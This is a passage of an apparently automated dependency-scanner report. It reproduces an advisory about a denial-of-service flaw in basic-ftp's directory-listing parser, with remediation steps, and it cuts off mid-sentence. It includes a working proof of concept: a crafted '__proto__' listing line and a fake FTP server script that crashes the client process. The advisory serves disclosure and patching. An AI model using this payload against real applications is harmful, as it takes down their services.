            {
              "deprecatedIds": [
                "CVE-2026-126345",
                "GHSA-5pm8-86m8-9m6r"
              ],
              "fullDescription": {
                "markdown": "### Summary\n\nbasic-ftp's MLSD directory-listing parser (src/parseListMLSD.ts) looks up fact-handler functions in a plain object literal keyed directly by fact names taken from the FTP server's response, with no validation. A directory-listing line containing the fact name \"__proto__\" resolves this lookup to Object.prototype (inherited, non-own, non-function) instead of undefined, so the \"not a function\" guard is bypassed and the code throws `TypeError: factHandler is not a function`.\n\nThis TypeError is not an FTPError, so it is not caught by Client.list()'s retry logic and propagates as a rejected promise out of list() and every API built on top of it (list, downloadToDir, uploadFromDir, clearWorkingDir, removeDir). Any FTP server the client connects to — or any on-path attacker on a plaintext (non-TLS) FTP session — can crash the calling application by returning one crafted line in a directory listing. If the application does not wrap every one of these calls in try/catch, the rejection is unhandled and crashes the Node.js process (default behavior since Node 15).\n\n### Details\n\nFile: src/parseListMLSD.ts\n```\nconst factHandlersByName: {[key: string]: FactHandler} = {\n    \"size\": parseSize,\n    \"sizd\": parseSize,\n    \"unique\": (value, info) =\u003e { info.uniqueID = value },\n    \"modify\": (value, info) =\u003e { ... },\n    \"type\": (value, info) =\u003e { ... },\n    \"unix.mode\": (value, info) =\u003e { ... },\n    ...\n}\n\nexport function parseLine(line: string): FileInfo | undefined {\n    const [ packedFacts, name ] = splitStringOnce(line, \" \")\n    ...\n    const facts = packedFacts.split(\";\")\n    for (const fact of facts) {\n        const [ factName, factValue ] = splitStringOnce(fact, \"=\")\n        if (!factValue) { continue }\n        const factHandler = factHandlersByName[factName.toLowerCase()]   // \u003c-- unsafe lookup\n        if (!factHandler) { continue }\n        const result = factHandler(factValue, info)                     // \u003c-- throws here\n        ...\n    }\n    return info\n}\n```\nfactHandlersByName is a plain `{}` object literal, so it inherits from Object.prototype. Property access does not distinguish own keys from inherited ones. When factName.toLowerCase() === \"__proto__\", the bracket lookup factHandlersByName[\"__proto__\"] returns Object.prototype itself — a truthy, non-undefined value — so the `if (!factHandler) continue` guard does not fire. The code then tries to call Object.prototype as a function: `factHandler(factValue, info)`, which throws `TypeError: factHandler is not a function`.\n\nThis line runs inside parseList() (src/parseList.ts), called synchronously from a `.map()` over every line of the listing, which in turn is called from Client._requestListWithCommand() -\u003e Client.list() (src/Client.ts). list()'s only error handling is:\n```\n    catch (err) {\n        const shouldTryNext = err instanceof FTPError\n        if (!shouldTryNext) { throw err }\n        lastError = err\n    }\n```\nA plain TypeError is not an FTPError, so it is immediately rethrown instead of being retried or suppressed, and the Promise returned by list() rejects with it.\n\nAffected call paths (all eventually call Client.list()):\n- Client.list()\n- Client.downloadToDir() / _downloadFromWorkingDir()\n- Client.clearWorkingDir()\n- Client.removeDir()\n\nOnly \"__proto__\" triggers the crash this way; other reserved Object.prototype property names tested (\"constructor\", \"toString\", \"hasOwnProperty\", \"valueOf\", \"__defineGetter__\") happen to resolve to actual functions on Object.prototype, so they are called without throwing (silently ineffective, not a crash). This confirms the root cause is the use of an unguarded object literal as a dictionary keyed by untrusted server input, rather than something specific to one property.\n\n### Proof of concept\n\nPrerequisites: Node.js, a clone/checkout of basic-ftp, `npm install` then `npm run buildOnly` (or `npx tsc`) to produce dist/.\n\nStep 1 — Minimal reproduction of the parser bug alone:\n\n    node -e '\n    const { parseList } = require(\"./dist/parseList\");\n    parseList(\"__proto__=x;type=file;size=10; evil.txt\");\n    '\n\nExpected result:\n    Uncaught TypeError: factHandler is not a function\n        at parseLine (.../dist/parseListMLSD.js:...)\n\nStep 2 — End-to-end reproduction through the public Client API, proving a real FTP server can trigger this over the wire with no client modification:\n\n    Save as poc.js in the repo root and run `node poc.js`:\n\n    const net = require(\"net\")\n    const { Client } = require(\"./dist/index\")\n\n    const server = net.createServer(socket =\u003e {\n        socket.write(\"220 fake ftp ready\\r\\n\")\n        socket.on(\"data\", data =\u003e {\n            const cmd = data.toString().trim()\n            if (cmd.startsWith(\"USER\")) socket.write(\"230 ok\\r\\n\")\n            else if (cmd.startsWith(\"OPTS\") || cmd.startsWith(\"TYPE\") ||\n                     cmd.startsWith(\"STRU\") || cmd.startsWith(\"PBSZ\") ||\n                     cmd.startsWith(\"PROT\")) socket.write(\"200 ok\\r\\n\")\n            else if (cmd.startsWith(\"FEAT\")) socket.write(\"211-Features\\r\\n MLST type;size;\\r\\n211 End\\r\\n\")\n            else if (cmd.startsWith(\"EPSV\")) {\n                const dataServer = net.createServer(dsock =\u003e {\n                    // The malicious line: fact name \"__proto__\"\n                    dsock.end(\"__proto__=pwn;type=file;size=4; evil.txt\\r\\n\")\n                })\n                dataServer.listen(0, \"127.0.0.1\", () =\u003e {\n                    const p = dataServer.address().port\n                    socket.write(`229 Entering Extended Passive Mode (|||${p}|)\\r\\n`)\n                })\n            }\n            else if (cmd.startsWith(\"MLSD\") || cmd.startsWith(\"LIST\")) {\n                socket.write(\"150 Here comes the listing\\r\\n\")\n                setTimeout(() =\u003e socket.write(\"226 Listing complete\\r\\n\"), 50)\n            }\n            else socket.write(\"200 ok\\r\\n\")\n        })\n    })\n\n    server.listen(2121, \"127.0.0.1\", async () =\u003e {\n        const client = new Client()\n        try {\n            await client.access({ host: \"127.0.0.1\", port: 2121, user: \"a\", password: \"b\" })\n            const files = await client.list()\n            console.log(\"list() returned normally (unexpected):\", files)\n        } catch (err) {\n            console.log(\"client.list() threw:\", err.constructor.name, \"-\", err.message)\n        } finally {\n            client.close()\n            server.close()\n            process.exit(0)\n        }\n    })\n\nExpected output:\n\n    client.list() threw: TypeError - factHandler is not a function\n\nConfiguration notes:\n- No TLS, auth bypass, or special server config needed — this is a plain FTP (PASV/EPSV\n  text) session using the server's FEAT response to turn on MLSD, which is the common\n  path for any modern FTP server.\n- The same crash can be delivered via a LIST-fallback MLSD-shaped line too, since\n  parseList() auto-detects the format from the last listing line.\n- In a real application without a try/catch around list()/downloadToDir()/\n  clearWorkingDir()/removeDir(), this rejection is unhandled and terminates the\n  Node.js process by default (Node \u003e=15 unhandledRejection behavior is \"throw\").\n\n### Impact\n\nType: Denial of Service (CWE-248: Uncaught Exception, enabled by CWE-1321-style unguarded dictionary lookup on an object literal).\n\nWho is impacted: Any application using basic-ftp's Client.list(), downloadToDir(), uploadFromDir() (via ensureDir/clearWorkingDir paths), clearWorkingDir(), or removeDir() against a server that is malicious, compromised, or reachable by an on-path attacker on a non-TLS FTP session. No authentication to the target server is required beyond whatever credentials the application already uses, and no user interaction is required — a single crafted directory-listing line is sufficient.\n\nConfidentiality: None. Integrity: None. Availability: High — unhandled rejection crashes the Node.js process by default, taking down the whole application/service, not just the FTP operation.",
                "text": "### Summary\n\nbasic-ftp's MLSD directory-listing parser (src/parseListMLSD.ts) looks up fact-handler functions in a plain object literal keyed directly by fact names taken from the FTP server's response, with no validation. A directory-listing line containing the fact name \"__proto__\" resolves this lookup to Object.prototype (inherited, non-own, non-function) instead of undefined, so the \"not a function\" guard is bypassed and the code throws `TypeError: factHandler is not a function`.\n\nThis TypeError is not an FTPError, so it is not caught by Client.list()'s retry logic and propagates as a rejected promise out of list() and every API built on top of it (list, downloadToDir, uploadFromDir, clearWorkingDir, removeDir). Any FTP server the client connects to — or any on-path attacker on a plaintext (non-TLS) FTP session — can crash the calling application by returning one crafted line in a directory listing. If the application does not wrap every one of these calls in try/catch, the rejection is unhandled and crashes the Node.js process (default behavior since Node 15).\n\n### Details\n\nFile: src/parseListMLSD.ts\n```\nconst factHandlersByName: {[key: string]: FactHandler} = {\n    \"size\": parseSize,\n    \"sizd\": parseSize,\n    \"unique\": (value, info) =\u003e { info.uniqueID = value },\n    \"modify\": (value, info) =\u003e { ... },\n    \"type\": (value, info) =\u003e { ... },\n    \"unix.mode\": (value, info) =\u003e { ... },\n    ...\n}\n\nexport function parseLine(line: string): FileInfo | undefined {\n    const [ packedFacts, name ] = splitStringOnce(line, \" \")\n    ...\n    const facts = packedFacts.split(\";\")\n    for (const fact of facts) {\n        const [ factName, factValue ] = splitStringOnce(fact, \"=\")\n        if (!factValue) { continue }\n        const factHandler = factHandlersByName[factName.toLowerCase()]   // \u003c-- unsafe lookup\n        if (!factHandler) { continue }\n        const result = factHandler(factValue, info)                     // \u003c-- throws here\n        ...\n    }\n    return info\n}\n```\nfactHandlersByName is a plain `{}` object literal, so it inherits from Object.prototype. Property access does not distinguish own keys from inherited ones. When factName.toLowerCase() === \"__proto__\", the bracket lookup factHandlersByName[\"__proto__\"] returns Object.prototype itself — a truthy, non-undefined value — so the `if (!factHandler) continue` guard does not fire. The code then tries to call Object.prototype as a function: `factHandler(factValue, info)`, which throws `TypeError: factHandler is not a function`.\n\nThis line runs inside parseList() (src/parseList.ts), called synchronously from a `.map()` over every line of the listing, which in turn is called from Client._requestListWithCommand() -\u003e Client.list() (src/Client.ts). list()'s only error handling is:\n```\n    catch (err) {\n        const shouldTryNext = err instanceof FTPError\n        if (!shouldTryNext) { throw err }\n        lastError = err\n    }\n```\nA plain TypeError is not an FTPError, so it is immediately rethrown instead of being retried or suppressed, and the Promise returned by list() rejects with it.\n\nAffected call paths (all eventually call Client.list()):\n- Client.list()\n- Client.downloadToDir() / _downloadFromWorkingDir()\n- Client.clearWorkingDir()\n- Client.removeDir()\n\nOnly \"__proto__\" triggers the crash this way; other reserved Object.prototype property names tested (\"constructor\", \"toString\", \"hasOwnProperty\", \"valueOf\", \"__defineGetter__\") happen to resolve to actual functions on Object.prototype, so they are called without throwing (silently ineffective, not a crash). This confirms the root cause is the use of an unguarded object literal as a dictionary keyed by untrusted server input, rather than something specific to one property.\n\n### Proof of concept\n\nPrerequisites: Node.js, a clone/checkout of basic-ftp, `npm install` then `npm run buildOnly` (or `npx tsc`) to produce dist/.\n\nStep 1 — Minimal reproduction of the parser bug alone:\n\n    node -e '\n    const { parseList } = require(\"./dist/parseList\");\n    parseList(\"__proto__=x;type=file;size=10; evil.txt\");\n    '\n\nExpected result:\n    Uncaught TypeError: factHandler is not a function\n        at parseLine (.../dist/parseListMLSD.js:...)\n\nStep 2 — End-to-end reproduction through the public Client API, proving a real FTP server can trigger this over the wire with no client modification:\n\n    Save as poc.js in the repo root and run `node poc.js`:\n\n    const net = require(\"net\")\n    const { Client } = require(\"./dist/index\")\n\n    const server = net.createServer(socket =\u003e {\n        socket.write(\"220 fake ftp ready\\r\\n\")\n        socket.on(\"data\", data =\u003e {\n            const cmd = data.toString().trim()\n            if (cmd.startsWith(\"USER\")) socket.write(\"230 ok\\r\\n\")\n            else if (cmd.startsWith(\"OPTS\") || cmd.startsWith(\"TYPE\") ||\n                     cmd.startsWith(\"STRU\") || cmd.startsWith(\"PBSZ\") ||\n                     cmd.startsWith(\"PROT\")) socket.write(\"200 ok\\r\\n\")\n            else if (cmd.startsWith(\"FEAT\")) socket.write(\"211-Features\\r\\n MLST type;size;\\r\\n211 End\\r\\n\")\n            else if (cmd.startsWith(\"EPSV\")) {\n                const dataServer = net.createServer(dsock =\u003e {\n                    // The malicious line: fact name \"__proto__\"\n                    dsock.end(\"__proto__=pwn;type=file;size=4; evil.txt\\r\\n\")\n                })\n                dataServer.listen(0, \"127.0.0.1\", () =\u003e {\n                    const p = dataServer.address().port\n                    socket.write(`229 Entering Extended Passive Mode (|||${p}|)\\r\\n`)\n                })\n            }\n            else if (cmd.startsWith(\"MLSD\") || cmd.startsWith(\"LIST\")) {\n                socket.write(\"150 Here comes the listing\\r\\n\")\n                setTimeout(() =\u003e socket.write(\"226 Listing complete\\r\\n\"), 50)\n            }\n            else socket.write(\"200 ok\\r\\n\")\n        })\n    })\n\n    server.listen(2121, \"127.0.0.1\", async () =\u003e {\n        const client = new Client()\n        try {\n            await client.access({ host: \"127.0.0.1\", port: 2121, user: \"a\", password: \"b\" })\n            const files = await client.list()\n            console.log(\"list() returned normally (unexpected):\", files)\n        } catch (err) {\n            console.log(\"client.list() threw:\", err.constructor.name, \"-\", err.message)\n        } finally {\n            client.close()\n            server.close()\n            process.exit(0)\n        }\n    })\n\nExpected output:\n\n    client.list() threw: TypeError - factHandler is not a function\n\nConfiguration notes:\n- No TLS, auth bypass, or special server config needed — this is a plain FTP (PASV/EPSV\n  text) session using the server's FEAT response to turn on MLSD, which is the common\n  path for any modern FTP server.\n- The same crash can be delivered via a LIST-fallback MLSD-shaped line too, since\n  parseList() auto-detects the format from the last listing line.\n- In a real application without a try/catch around list()/downloadToDir()/\n  clearWorkingDir()/removeDir(), this rejection is unhandled and terminates the\n  Node.js process by default (Node \u003e=15 unhandledRejection behavior is \"throw\").\n\n### Impact\n\nType: Denial of Service (CWE-248: Uncaught Exception, enabled by CWE-1321-style unguarded dictionary lookup on an object literal).\n\nWho is impacted: Any application using basic-ftp's Client.list(), downloadToDir(), uploadFromDir() (via ensureDir/clearWorkingDir paths), clearWorkingDir(), or removeDir() against a server that is malicious, compromised, or reachable by an on-path attacker on a non-TLS FTP session. No authentication to the target server is required beyond whatever credentials the application already uses, and no user interaction is required — a single crafted directory-listing line is sufficient.\n\nConfidentiality: None. Integrity: None. Availability: High — unhandled rejection crashes the Node.js process by default, taking down the whole application/service, not just the FTP operation."
              },
              "help": {
                "markdown": "**Your dependency is vulnerable to [CVE-2026-126345](https://osv.dev/CVE-2026-126345)**.\n\n## [GHSA-5pm8-86m8-9m6r](https://osv.dev/GHSA-5pm8-86m8-9m6r)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Summary\n\u003e \n\u003e basic-ftp's MLSD directory-listing parser (src/parseListMLSD.ts) looks up fact-handler functions in a plain object literal keyed directly by fact names taken from the FTP server's response, with no validation. A directory-listing line containing the fact name \"__proto__\" resolves this lookup to Object.prototype (inherited, non-own, non-function) instead of undefined, so the \"not a function\" guard is bypassed and the code throws `TypeError: factHandler is not a function`.\n\u003e \n\u003e This TypeError is not an FTPError, so it is not caught by Client.list()'s retry logic and propagates as a rejected promise out of list() and every API built on top of it (list, downloadToDir, uploadFromDir, clearWorkingDir, removeDir). Any FTP server the client connects to — or any on-path attacker on a plaintext (non-TLS) FTP session — can crash the calling application by returning one crafted line in a directory listing. If the application does not wrap every one of these calls in try/catch, the rejection is unhandled and crashes the Node.js process (default behavior since Node 15).\n\u003e \n\u003e ### Details\n\u003e \n\u003e File: src/parseListMLSD.ts\n\u003e ```\n\u003e const factHandlersByName: {[key: string]: FactHandler} = {\n\u003e     \"size\": parseSize,\n\u003e     \"sizd\": parseSize,\n\u003e     \"unique\": (value, info) =\u003e { info.uniqueID = value },\n\u003e     \"modify\": (value, info) =\u003e { ... },\n\u003e     \"type\": (value, info) =\u003e { ... },\n\u003e     \"unix.mode\": (value, info) =\u003e { ... },\n\u003e     ...\n\u003e }\n\u003e \n\u003e export function parseLine(line: string): FileInfo | undefined {\n\u003e     const [ packedFacts, name ] = splitStringOnce(line, \" \")\n\u003e     ...\n\u003e     const facts = packedFacts.split(\";\")\n\u003e     for (const fact of facts) {\n\u003e         const [ factName, factValue ] = splitStringOnce(fact, \"=\")\n\u003e         if (!factValue) { continue }\n\u003e         const factHandler = factHandlersByName[factName.toLowerCase()]   // \u003c-- unsafe lookup\n\u003e         if (!factHandler) { continue }\n\u003e         const result = factHandler(factValue, info)                     // \u003c-- throws here\n\u003e         ...\n\u003e     }\n\u003e     return info\n\u003e }\n\u003e ```\n\u003e factHandlersByName is a plain `{}` object literal, so it inherits from Object.prototype. Property access does not distinguish own keys from inherited ones. When factName.toLowerCase() === \"__proto__\", the bracket lookup factHandlersByName[\"__proto__\"] returns Object.prototype itself — a truthy, non-undefined value — so the `if (!factHandler) continue` guard does not fire. The code then tries to call Object.prototype as a function: `factHandler(factValue, info)`, which throws `TypeError: factHandler is not a function`.\n\u003e \n\u003e This line runs inside parseList() (src/parseList.ts), called synchronously from a `.map()` over every line of the listing, which in turn is called from Client._requestListWithCommand() -\u003e Client.list() (src/Client.ts). list()'s only error handling is:\n\u003e ```\n\u003e     catch (err) {\n\u003e         const shouldTryNext = err instanceof FTPError\n\u003e         if (!shouldTryNext) { throw err }\n\u003e         lastError = err\n\u003e     }\n\u003e ```\n\u003e A plain TypeError is not an FTPError, so it is immediately rethrown instead of being retried or suppressed, and the Promise returned by list() rejects with it.\n\u003e \n\u003e Affected call paths (all eventually call Client.list()):\n\u003e - Client.list()\n\u003e - Client.downloadToDir() / _downloadFromWorkingDir()\n\u003e - Client.clearWorkingDir()\n\u003e - Client.removeDir()\n\u003e \n\u003e Only \"__proto__\" triggers the crash this way; other reserved Object.prototype property names tested (\"constructor\", \"toString\", \"hasOwnProperty\", \"valueOf\", \"__defineGetter__\") happen to resolve to actual functions on Object.prototype, so they are called without throwing (silently ineffective, not a crash). This confirms the root cause is the use of an unguarded object literal as a dictionary keyed by untrusted server input, rather than something specific to one property.\n\u003e \n\u003e ### Proof of concept\n\u003e \n\u003e Prerequisites: Node.js, a clone/checkout of basic-ftp, `npm install` then `npm run buildOnly` (or `npx tsc`) to produce dist/.\n\u003e \n\u003e Step 1 — Minimal reproduction of the parser bug alone:\n\u003e \n\u003e     node -e '\n\u003e     const { parseList } = require(\"./dist/parseList\");\n\u003e     parseList(\"__proto__=x;type=file;size=10; evil.txt\");\n\u003e     '\n\u003e \n\u003e Expected result:\n\u003e     Uncaught TypeError: factHandler is not a function\n\u003e         at parseLine (.../dist/parseListMLSD.js:...)\n\u003e \n\u003e Step 2 — End-to-end reproduction through the public Client API, proving a real FTP server can trigger this over the wire with no client modification:\n\u003e \n\u003e     Save as poc.js in the repo root and run `node poc.js`:\n\u003e \n\u003e     const net = require(\"net\")\n\u003e     const { Client } = require(\"./dist/index\")\n\u003e \n\u003e     const server = net.createServer(socket =\u003e {\n\u003e         socket.write(\"220 fake ftp ready\\r\\n\")\n\u003e         socket.on(\"data\", data =\u003e {\n\u003e             const cmd = data.toString().trim()\n\u003e             if (cmd.startsWith(\"USER\")) socket.write(\"230 ok\\r\\n\")\n\u003e             else if (cmd.startsWith(\"OPTS\") || cmd.startsWith(\"TYPE\") ||\n\u003e                      cmd.startsWith(\"STRU\") || cmd.startsWith(\"PBSZ\") ||\n\u003e                      cmd.startsWith(\"PROT\")) socket.write(\"200 ok\\r\\n\")\n\u003e             else if (cmd.startsWith(\"FEAT\")) socket.write(\"211-Features\\r\\n MLST type;size;\\r\\n211 End\\r\\n\")\n\u003e             else if (cmd.startsWith(\"EPSV\")) {\n\u003e                 const dataServer = net.createServer(dsock =\u003e {\n\u003e                     // The malicious line: fact name \"__proto__\"\n\u003e                     dsock.end(\"__proto__=pwn;type=file;size=4; evil.txt\\r\\n\")\n\u003e                 })\n\u003e                 dataServer.listen(0, \"127.0.0.1\", () =\u003e {\n\u003e                     const p = dataServer.address().port\n\u003e                     socket.write(`229 Entering Extended Passive Mode (|||${p}|)\\r\\n`)\n\u003e                 })\n\u003e             }\n\u003e             else if (cmd.startsWith(\"MLSD\") || cmd.startsWith(\"LIST\")) {\n\u003e                 socket.write(\"150 Here comes the listing\\r\\n\")\n\u003e                 setTimeout(() =\u003e socket.write(\"226 Listing complete\\r\\n\"), 50)\n\u003e             }\n\u003e             else socket.write(\"200 ok\\r\\n\")\n\u003e         })\n\u003e     })\n\u003e \n\u003e     server.listen(2121, \"127.0.0.1\", async () =\u003e {\n\u003e         const client = new Client()\n\u003e         try {\n\u003e             await client.access({ host: \"127.0.0.1\", port: 2121, user: \"a\", password: \"b\" })\n\u003e             const files = await client.list()\n\u003e             console.log(\"list() returned normally (unexpected):\", files)\n\u003e         } catch (err) {\n\u003e             console.log(\"client.list() threw:\", err.constructor.name, \"-\", err.message)\n\u003e         } finally {\n\u003e             client.close()\n\u003e             server.close()\n\u003e             process.exit(0)\n\u003e         }\n\u003e     })\n\u003e \n\u003e Expected output:\n\u003e \n\u003e     client.list() threw: TypeError - factHandler is not a function\n\u003e \n\u003e Configuration notes:\n\u003e - No TLS, auth bypass, or special server config needed — this is a plain FTP (PASV/EPSV\n\u003e   text) session using the server's FEAT response to turn on MLSD, which is the common\n\u003e   path for any modern FTP server.\n\u003e - The same crash can be delivered via a LIST-fallback MLSD-shaped line too, since\n\u003e   parseList() auto-detects the format from the last listing line.\n\u003e - In a real application without a try/catch around list()/downloadToDir()/\n\u003e   clearWorkingDir()/removeDir(), this rejection is unhandled and terminates the\n\u003e   Node.js process by default (Node \u003e=15 unhandledRejection behavior is \"throw\").\n\u003e \n\u003e ### Impact\n\u003e \n\u003e Type: Denial of Service (CWE-248: Uncaught Exception, enabled by CWE-1321-style unguarded dictionary lookup on an object literal).\n\u003e \n\u003e Who is impacted: Any application using basic-ftp's Client.list(), downloadToDir(), uploadFromDir() (via ensureDir/clearWorkingDir paths), clearWorkingDir(), or removeDir() against a server that is malicious, compromised, or reachable by an on-path attacker on a non-TLS FTP session. No authentication to the target server is required beyond whatever credentials the application already uses, and no user interaction is required — a single crafted directory-listing line is sufficient.\n\u003e \n\u003e Confidentiality: None. Integrity: None. Availability: High — unhandled rejection crashes the Node.js process by default, taking down the whole application/service, not just the FTP operation.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/user/felipe/speckit/juice-shop-master/package-lock.json | basic-ftp | 5.3.1 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-5pm8-86m8-9m6r | basic-ftp | 6.2.4 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/user/felipe/speckit/juice-shop-master/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-126345\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
                "text": "**Your dependency is vulnerable to [CVE-2026-126345](https://osv.dev/CVE-2026-126345)**.\n\n## [GHSA-5pm8-86m8-9m6r](https://osv.dev/GHSA-5pm8-86m8-9m6r)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Summary\n\u003e \n\u003e basic-ftp's MLSD directory-listing parser (src/parseListMLSD.ts) looks up fact-handler functions in a plain object literal keyed directly by fact names taken from the FTP server's response, with no validation. A directory-listing line containing the fact name \"__proto__\" resolves this lookup to Object.prototype (inherited, non-own, non-function) instead of undefined, so the \"not a function\" guard is bypassed and the code throws `TypeError: factHandler is not a function`.\n\u003e \n\u003e This TypeError is not an FTPError, so it is not caught by Client.list()'s retry logic and propagates as a rejected promise out of list() and every API built on top of it (list, downloadToDir, uploadFromDir, clearWorkingDir, removeDir). Any FTP server the client connects to — or any on-path attacker on a plaintext (non-TLS) FTP session — can crash the calling application by returning one crafted line in a directory listing. If the application does not wrap every one of these calls in try/catch, the rejection is unhandled and crashes the Node.js process (default behavior since Node 15).\n\u003e \n\u003e ### Details\n\u003e \n\u003e File: src/parseListMLSD.ts\n\u003e ```\n\u003e const factHandlersByName: {[key: string]: FactHandler} = {\n\u003e     \"size\": parseSize,\n\u003e     \"sizd\": parseSize,\n\u003e     \"unique\": (value, info) =\u003e { info.uniqueID = value },\n\u003e     \"modify\": (value, info) =\u003e { ... },\n\u003e     \"type\": (value, info) =\u003e { ... },\n\u003e     \"unix.mode\": (value, info) =\u003e { ... },\n\u003e     ...\n\u003e }\n\u003e \n\u003e export function parseLine(line: string): FileInfo | undefined {\n\u003e     const [ packedFacts, name ] = splitStringOnce(line, \" \")\n\u003e     ...\n\u003e     const facts = packedFacts.split(\";\")\n\u003e     for (const fact of facts) {\n\u003e         const [ factName, factValue ] = splitStringOnce(fact, \"=\")\n\u003e         if (!factValue) { continue }\n\u003e         const factHandler = factHandlersByName[factName.toLowerCase()]   // \u003c-- unsafe lookup\n\u003e         if (!factHandler) { continue }\n\u003e         const result = factHandler(factValue, info)                     // \u003c-- throws here\n\u003e         ...\n\u003e     }\n\u003e     return info\n\u003e }\n\u003e ```\n\u003e factHandlersByName is a plain `{}` object literal, so it inherits from Object.prototype. Property access does not distinguish own keys from inherited ones. When factName.toLowerCase() === \"__proto__\", the bracket lookup factHandlersByName[\"__proto__\"] returns Object.prototype itself — a truthy, non-undefined value — so the `if (!factHandler) continue` guard does not fire. The code then tries to call Object.prototype as a function: `factHandler(factValue, info)`, which throws `TypeError: factHandler is not a function`.\n\u003e \n\u003e This line runs inside parseList() (src/parseList.ts), called synchronously from a `.map()` over every line of the listing, which in turn is called from Client._requestListWithCommand() -\u003e Client.list() (src/Client.ts). list()'s only error handling is:\n\u003e ```\n\u003e     catch (err) {\n\u003e         const shouldTryNext = err instanceof FTPError\n\u003e         if (!shouldTryNext) { throw err }\n\u003e         lastError = err\n\u003e     }\n\u003e ```\n\u003e A plain TypeError is not an FTPError, so it is immediately rethrown instead of being retried or suppressed, and the Promise returned by list() rejects with it.\n\u003e \n\u003e Affected call paths (all eventually call Client.list()):\n\u003e - Client.list()\n\u003e - Client.downloadToDir() / _downloadFromWorkingDir()\n\u003e - Client.clearWorkingDir()\n\u003e - Client.removeDir()\n\u003e \n\u003e Only \"__proto__\" triggers the crash this way; other reserved Object.prototype property names tested (\"constructor\", \"toString\", \"hasOwnProperty\", \"valueOf\", \"__defineGetter__\") happen to resolve to actual functions on Object.prototype, so they are called without throwing (silently ineffective, not a crash). This confirms the root cause is the use of an unguarded object literal as a dictionary keyed by untrusted server input, rather than something specific to one property.\n\u003e \n\u003e ### Proof of concept\n\u003e \n\u003e Prerequisites: Node.js, a clone/checkout of basic-ftp, `npm install` then `npm run buildOnly` (or `npx tsc`) to produce dist/.\n\u003e \n\u003e Step 1 — Minimal reproduction of the parser bug alone:\n\u003e \n\u003e     node -e '\n\u003e     const { parseList } = require(\"./dist/parseList\");\n\u003e     parseList(\"__proto__=x;type=file;size=10; evil.txt\");\n\u003e     '\n\u003e \n\u003e Expected result:\n\u003e     Uncaught TypeError: factHandler is not a function\n\u003e         at parseLine (.../dist/parseListMLSD.js:...)\n\u003e \n\u003e Step 2 — End-to-end reproduction through the public Client API, proving a real FTP server can trigger this over the wire with no client modification:\n\u003e \n\u003e     Save as poc.js in the repo root and run `node poc.js`:\n\u003e \n\u003e     const net = require(\"net\")\n\u003e     const { Client } = require(\"./dist/index\")\n\u003e \n\u003e     const server = net.createServer(socket =\u003e {\n\u003e         socket.write(\"220 fake ftp ready\\r\\n\")\n\u003e         socket.on(\"data\", data =\u003e {\n\u003e             const cmd = data.toString().trim()\n\u003e             if (cmd.startsWith(\"USER\")) socket.write(\"230 ok\\r\\n\")\n\u003e             else if (cmd.startsWith(\"OPTS\") || cmd.startsWith(\"TYPE\") ||\n\u003e                      cmd.startsWith(\"STRU\") || cmd.startsWith(\"PBSZ\") ||\n\u003e                      cmd.startsWith(\"PROT\")) socket.write(\"200 ok\\r\\n\")\n\u003e             else if (cmd.startsWith(\"FEAT\")) socket.write(\"211-Features\\r\\n MLST type;size;\\r\\n211 End\\r\\n\")\n\u003e             else if (cmd.startsWith(\"EPSV\")) {\n\u003e                 const dataServer = net.createServer(dsock =\u003e {\n\u003e                     // The malicious line: fact name \"__proto__\"\n\u003e                     dsock.end(\"__proto__=pwn;type=file;size=4; evil.txt\\r\\n\")\n\u003e                 })\n\u003e                 dataServer.listen(0, \"127.0.0.1\", () =\u003e {\n\u003e                     const p = dataServer.address().port\n\u003e                     socket.write(`229 Entering Extended Passive Mode (|||${p}|)\\r\\n`)\n\u003e                 })\n\u003e             }\n\u003e             else if (cmd.startsWith(\"MLSD\") || cmd.startsWith(\"LIST\")) {\n\u003e                 socket.write(\"150 Here comes the listing\\r\\n\")\n\u003e                 setTimeout(() =\u003e socket.write(\"226 Listing complete\\r\\n\"), 50)\n\u003e             }\n\u003e             else socket.write(\"200 ok\\r\\n\")\n\u003e         })\n\u003e     })\n\u003e \n\u003e     server.listen(2121, \"127.0.0.1\", async () =\u003e {\n\u003e         const client = new Client()\n\u003e         try {\n\u003e             await client.access({ host: \"127.0.0.1\", port: 2121, user: \"a\", password: \"b\" })\n\u003e             const files = await client.list()\n\u003e             console.log(\"list() returned normally (unexpected):\", files)\n\u003e         } catch (err) {\n\u003e             console.log(\"client.list() threw:\", err.constructor.name, \"-\", err.message)\n\u003e         } finally {\n\u003e             client.close()\n\u003e             server.close()\n\u003e             process.exit(0)\n\u003e         }\n\u003e     })\n\u003e \n\u003e Expected output:\n\u003e \n\u003e     client.list() threw: TypeError - factHandler is not a function\n\u003e \n\u003e Configuration notes:\n\u003e - No TLS, auth bypass, or special server config needed — this is a plain FTP (PASV/EPSV\n\u003e   text) session using the server's FEAT response to turn on MLSD, which is the common\n\u003e   path for any modern FTP server.\n\u003e - The same crash can be delivered via a LIST-fallback MLSD-shaped line too, since\n\u003e   parseList() auto-detects the format from the last listing line.\n\u003e - In a real application without a try/catch around list()/downloadToDir()/\n\u003e   clearWorkingDir()/removeDir(), this rejection is unhandled and terminates the\n\u003e   Node.js process by default (Node \u003e=15 unhandledRejection behavior is \"throw\").\n\u003e \n\u003e ### Impact\n\u003e \n\u003e Type: Denial of Service (CWE-248: Uncaught Exception, enabled by CWE-1321-style unguarded dictionary lookup on an object literal).\n\u003e \n\u003e Who is impacted: Any application using basic-ftp's Client.list(), downloadToDir(), uploadFromDir() (via ensureDir/clearWorkingDir paths), clearWorkingDir(), or removeDir() against a server that is malicious, compromised, or reachable by an on-path attacker on a non-TLS FTP session. No authentication to the target server is required beyond whatever credentials the application already uses, and no user interaction is required — a single crafted directory-listing line is sufficient.\n\u003e \n\u003e Confidentiality: None. Integrity: 